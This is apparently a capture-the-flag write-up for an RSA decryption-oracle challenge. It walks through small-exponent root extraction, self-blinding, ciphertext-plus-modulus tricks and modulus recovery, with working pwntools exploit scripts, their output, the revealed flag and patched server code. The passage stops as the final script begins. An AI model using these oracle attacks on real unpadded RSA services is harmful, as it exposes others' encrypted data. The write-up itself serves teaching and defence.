&lt;p&gt;When a very small &lt;code&gt;e&lt;/code&gt; (&lt;code&gt;3&lt;/code&gt;, &lt;code&gt;5&lt;/code&gt; or &lt;code&gt;7&lt;/code&gt; for example) is used in textbook RSA the decrypted message &lt;code&gt;m&lt;/code&gt; can be recovered by taking the &lt;code&gt;e&lt;/code&gt;-th root of &lt;code&gt;c&lt;/code&gt;. This happens because if &lt;code&gt;m^e&lt;/code&gt; is smaller than the modulus &lt;code&gt;n&lt;/code&gt; the modulo operation never happens and no actual encryption takes place. The solution to this is to always pad messages (with &lt;code&gt;OAEP&lt;/code&gt; for example) and to use a larger &lt;code&gt;e&lt;/code&gt;. &lt;code&gt;65537&lt;/code&gt; is pretty much the universal default as exponentiation with &lt;a href=&#34;https://en.wikipedia.org/wiki/Fermat_number&#34;&gt;Fermat Numbers&lt;/a&gt; is nice and efficient.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;the vulnerability stems from this line of code :
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	e = random.randrange(3, 65537, 2)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;e can take any odd value in [3, 65537[
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;e being small enough for an n-th root attack (3, 5 or 7) has a probability of
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;							3 * ((65535-3) / 2)⁻¹ ≈ 9.15e-05
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;So roughly 1 over 10 thousand. It will take, on average, 5_000 requests to be able to get a small enough e. This is easily bruteforceable, even over the internet.
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; tqdm &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; tqdm
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;warning&amp;#39;&lt;/span&gt;

recv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt;: int(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;invpow&lt;/span&gt;(x, n):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Taken from here : https://stackoverflow.com/questions/356090/how-to-compute-the-nth-root-of-a-very-big-integer
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
    high &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; high &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; x:
        high &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    low &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; high&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; low &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; high:
        mid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (low &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; high) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; low &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; mid &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; mid&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; x:
            low &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mid
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; high &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; mid &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; mid&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; x:
            high &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mid
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; mid
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; mid &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; tqdm(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10_000&lt;/span&gt;)):

    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;crypto.heroctf.fr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;)
    c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv()                             &lt;span style=&#34;color:#75715e&#34;&gt;# get c&lt;/span&gt;
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]:
        m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes(invpow(c, e))    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate m^1/3,&lt;/span&gt;
                                           &lt;span style=&#34;color:#75715e&#34;&gt;# m^1/5 and m^1/7&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hero{&amp;#34;&lt;/span&gt;):
            print(m)                       &lt;span style=&#34;color:#75715e&#34;&gt;# print m&lt;/span&gt;
            input()

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;output
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;alol@mecha-kraken$ python3 unintended1.py
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; 10%|██████▏                                                       | 991/10000 [15:03&amp;lt;2:32:33,  1.02s/it]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&amp;#39;Hero&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{m4ybe_le4ving_the_1nt3rn_run_th3_plac3_wasnt_a_g00d_id3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;unintended-n2--self-blinding&#34;&gt;Unintended n°2 : &amp;ldquo;self&amp;rdquo;-blinding&lt;/h1&gt;
&lt;p&gt;OK that was pretty cool but it took quite a while (I had to run the script above twice). Want to see a way to get the flag using a single query &lt;em&gt;instantly&lt;/em&gt; ? Well we&amp;rsquo;ll have to talk about blinding first.&lt;/p&gt;
&lt;p&gt;The RSA cryptosystem is interesting because it&amp;rsquo;s malleable when unpadded, ie. it&amp;rsquo;s possible to transform a ciphertext into another ciphertext which decrypts to a related plaintext. This comes from the fact that exponentiation is partially homomorphic.
$$
{\displaystyle {\begin{aligned}{\mathcal {E}}(m_{1})\cdot {\mathcal {E}}(m_{2})&amp;amp;=m_{1}^{e}m_{2}^{e};{\bmod {;}}n\[6pt]&amp;amp;=(m_{1}m_{2})^{e};{\bmod {;}}n\[6pt]&amp;amp;={\mathcal {E}}(m_{1}\cdot m_{2})\end{aligned}}}
$$
This malleability makes blinding trivial. &lt;a href=&#34;https://en.wikipedia.org/wiki/Blinding_(cryptography)&#34;&gt;Blinding, as defined by Wikipedia&lt;/a&gt;, is a technique by which an agent can provide a service to (i.e., compute a function for) a client in an encoded form without knowing either the real input or the real output. Blinding techniques also have applications to preventing side-channel attacks on encryption devices.
$$
\text{Alice wants Bob to sign a message m without it being revealed to Bob.}\
\text{Alice picks a random integer r and sends Bob }m&#39; \text{, such that }m \cdot \mathcal {E}(r) \equiv m&#39; [n] \
\text{Bob sends back } \mathcal {D}(m&#39;) = \mathcal {D}(m \cdot \mathcal {E}(r)) = \mathcal {D}(m) \cdot r \
\text{Alice can now divide }\mathcal {D}(m&#39;)\text{ by r to retrieve the signed message without Bob ever knowing the value of neither m nor r.}
$$&lt;/p&gt;
&lt;p&gt;We could try applying this principal to the challenge to retrieve the flag but we first have to encrypt &lt;code&gt;r&lt;/code&gt; and we don&amp;rsquo;t know &lt;code&gt;e&lt;/code&gt;. &lt;em&gt;If only we had a valid message encrypted by the server wink wink wink&lt;/em&gt;. That&amp;rsquo;s right, the encrypted flag is a valid message ! Instead of choosing a random &lt;code&gt;r&lt;/code&gt; to blind &lt;code&gt;m&lt;/code&gt; we can use the encrypted flag to blind itself, this way we can take the square root of &lt;code&gt;m&#39;&lt;/code&gt; to recover &lt;code&gt;m&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;warning&amp;#39;&lt;/span&gt;

send &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; m: r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(str(m)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
recv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt;: int(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;invpow&lt;/span&gt;(x, n):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Taken from here : https://stackoverflow.com/questions/356090/how-to-compute-the-nth-root-of-a-very-big-integer
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    [Removed for readability]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;crypto.heroctf.fr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;)
c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv()                             &lt;span style=&#34;color:#75715e&#34;&gt;# get c&lt;/span&gt;

send(pow(c, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;))                        &lt;span style=&#34;color:#75715e&#34;&gt;# send c^2&lt;/span&gt;

c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv()                             &lt;span style=&#34;color:#75715e&#34;&gt;# get m^2&lt;/span&gt;
print(long_to_bytes(invpow(c, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)))     &lt;span style=&#34;color:#75715e&#34;&gt;# print m&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;output
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;alol@mecha-kraken$ python3 unintended2.py
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&amp;#39;Hero&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{m4ybe_le4ving_the_1nt3rn_run_th3_plac3_wasnt_a_g00d_id3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;unintended-n3--modular-arithmetic&#34;&gt;Unintended n°3 : modular arithmetic&lt;/h1&gt;
&lt;p&gt;We just saw that blindly trusting the user input was a great way to get pwned. Lets do it again ! It uses a simple fact :&lt;/p&gt;
&lt;p&gt;$$
m \pm k\cdot n \equiv m [n]
$$
&lt;em&gt;Is that it ?&lt;/em&gt; Yep that&amp;rsquo;s it. After recovering &lt;code&gt;n&lt;/code&gt; you could just add &lt;code&gt;n&lt;/code&gt; to the encrypted flag, send it to the server and it would return the decrypted flag.
$$
{\displaystyle {
\begin{aligned}
{\mathcal {D}}(c + n) &amp;amp;= c^{d}n^{d};{\bmod {;}}n \[6pt]
&amp;amp;= c^{d};{\bmod {;}}n \[6pt]
&amp;amp;= m
\end{aligned}
}}
$$&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;warning&amp;#39;&lt;/span&gt;

send &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; m: r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(str(m)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
recv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt;: int(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;crypto.heroctf.fr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;)
c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv()                             &lt;span style=&#34;color:#75715e&#34;&gt;# get c&lt;/span&gt;

send(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)                               &lt;span style=&#34;color:#75715e&#34;&gt;# send -1&lt;/span&gt;

n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;                         &lt;span style=&#34;color:#75715e&#34;&gt;# get n&lt;/span&gt;
send(c &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; n)                            &lt;span style=&#34;color:#75715e&#34;&gt;# send c+n&lt;/span&gt;

print(long_to_bytes(recv()))           &lt;span style=&#34;color:#75715e&#34;&gt;# print m&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;output
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;alol@mecha-kraken$ python3 unintended3.py
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&amp;#39;Hero&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{m4ybe_le4ving_the_1nt3rn_run_th3_plac3_wasnt_a_g00d_id3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;the-intended-way-&#34;&gt;The intended way :&lt;/h1&gt;
&lt;p&gt;Before solving the challenge the intended way lets look into mitigations for the unintendeds.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; getStrongPrime, bytes_to_long
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.Padding &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pad
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random

FLAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pad(open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(), &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fix unintended n°1 : pad the flag so the&lt;/span&gt;
                                              &lt;span style=&#34;color:#75715e&#34;&gt;# decryption isn&amp;#39;t trivial anymore&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# [Removed for readability]&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
     t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; decrypt(int(input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c=&amp;#34;&lt;/span&gt;)))   &lt;span style=&#34;color:#75715e&#34;&gt;# fix unintended n°3 : make sure the output != flag&lt;/span&gt;
     print(t) &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; FLAG &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; t &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The unintended n°2 isn&amp;rsquo;t easy to patch so it&amp;rsquo;s been left in. Well done W00dy, you&amp;rsquo;re a pretty smart dude.&lt;/p&gt;
&lt;p&gt;So how was the challenge meant to be solved ? TL;DR : recover n, recover e and recover the flag.&lt;/p&gt;
&lt;h3 id=&#34;step-1-recover-n&#34;&gt;Step 1: recover n&lt;/h3&gt;
&lt;p&gt;Can&amp;rsquo;t do much modular arithmetic without a modulus right ? Retrieving n is surprisingly easy but requires a bit of thinking.
$$
{\displaystyle {\begin{aligned}
{\mathcal {D}}(-1) &amp;amp;= (-1)^{d} \bmod n\[6pt]
&amp;amp;=(-1)^{2k+1} \bmod n\[6pt]
&amp;amp;=(-1)^{2k} \cdot (-1)^{1} \bmod n\[6pt]
&amp;amp;=1\cdot -1 \bmod n\[6pt]
&amp;amp;=-1 \bmod n\[6pt]
&amp;amp;= n -1
\end{aligned}}}
$$
Just add one and you have &lt;code&gt;n&lt;/code&gt; ! But &lt;em&gt;why&lt;/em&gt; ? You&amp;rsquo;ll find a more in depth explanation &lt;a href=&#34;https://math.stackexchange.com/questions/1221723/why-in-rsa-the-public-exponent-e-must-be-coprime-with-phi-n&#34;&gt;here&lt;/a&gt; but basically :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;p&lt;/code&gt; and &lt;code&gt;q&lt;/code&gt; are two large primes so they&amp;rsquo;re odd numbers.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;n&lt;/code&gt;, the product of &lt;code&gt;p&lt;/code&gt; and &lt;code&gt;q&lt;/code&gt;, is odd and &lt;code&gt;φ&lt;/code&gt;, the product of &lt;code&gt;(p - 1)&lt;/code&gt; and &lt;code&gt;(q - 1)&lt;/code&gt;, is even.&lt;/li&gt;
&lt;li&gt;Lets recall that in RSA, &lt;code&gt;ed = kφ + 1&lt;/code&gt;. The right side of the equation is odd so the right side also must be odd, thus both &lt;code&gt;e&lt;/code&gt; and &lt;code&gt;d&lt;/code&gt; must odd.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;step-2-recover-e&#34;&gt;Step 2: recover e&lt;/h3&gt;
&lt;p&gt;Now that we have &lt;code&gt;n&lt;/code&gt; we&amp;rsquo;re only missing &lt;code&gt;e&lt;/code&gt; to be able to encrypt with the public key. We know &lt;code&gt;e&lt;/code&gt; is an odd number in the range &lt;code&gt;[3, 65537[&lt;/code&gt; so we can send an arbitrary value (say &lt;code&gt;2&lt;/code&gt; for example), receive &lt;code&gt;dec(2)&lt;/code&gt; and bruteforce all possible values for &lt;code&gt;e&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# [...]&lt;/span&gt;
send(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
two &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv()

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; tqdm(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65537&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)):
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pow(two, e, n) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;step-3-recover-the-flag&#34;&gt;Step 3: recover the flag&lt;/h3&gt;
&lt;p&gt;Now that we can encrypt arbitrary values we can perform a blinding attack. We&amp;rsquo;ll use &lt;code&gt;2&lt;/code&gt; and &lt;code&gt;dec(2)&lt;/code&gt; as we already have them.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the full script to retrieve the flag :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.Padding &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; unpad
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; tqdm &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; tqdm
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;warning&amp;#39;&lt;/span&gt;

